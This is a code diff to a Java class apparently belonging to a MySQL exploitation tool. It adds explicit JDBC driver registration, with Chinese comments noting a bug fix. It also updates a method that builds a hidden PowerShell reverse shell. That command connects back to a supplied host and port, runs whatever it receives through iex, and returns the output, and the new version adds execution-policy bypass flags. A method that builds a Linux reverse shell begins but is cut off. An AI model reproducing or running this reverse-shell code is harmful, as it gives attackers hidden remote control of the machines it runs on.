@@ -20,6 +20,15 @@ public class mysql {
         this.database = database;
         this.username = username;
         this.password = password;
+        /**
+         * 反馈的 bug, 已修复
+         * 显式注册 MySQL JDBC 驱动，避免打包时有些类加载环境下未自动加载
+         */
+        try {
+            Class.forName("com.mysql.cj.jdbc.Driver");
+        } catch (ClassNotFoundException e) {
+            System.err.println("[!] MySQL JDBC 驱动未找到: " + e.getMessage());
+        }
     }
 
     public static String readFiles(String path, String type) {
@@ -72,6 +81,12 @@ public class mysql {
 
     public boolean testConnection() {
         String url = String.format("jdbc:mysql://%s:%s/%s?useSSL=false", this.host, this.port, this.database);
+        // 保险起见在测试连接前也尝试注册驱动
+        try {
+            Class.forName("com.mysql.cj.jdbc.Driver");
+        } catch (ClassNotFoundException e) {
+            System.err.println("[!] MySQL JDBC 驱动未找到: " + e.getMessage());
+        }
         try (Connection tmp = DriverManager.getConnection(url, this.username, this.password)) {
             return tmp != null && !tmp.isClosed();
         } catch (SQLException e) {
@@ -304,7 +319,7 @@ public class mysql {
     }
 
     private String buildWindowsReverseShellCommand(String host, int port) {
-        return "powershell -WindowStyle Hidden -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
+        return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
     }
 
     private String buildLinuxReverseShellCommand(String host, int port) {
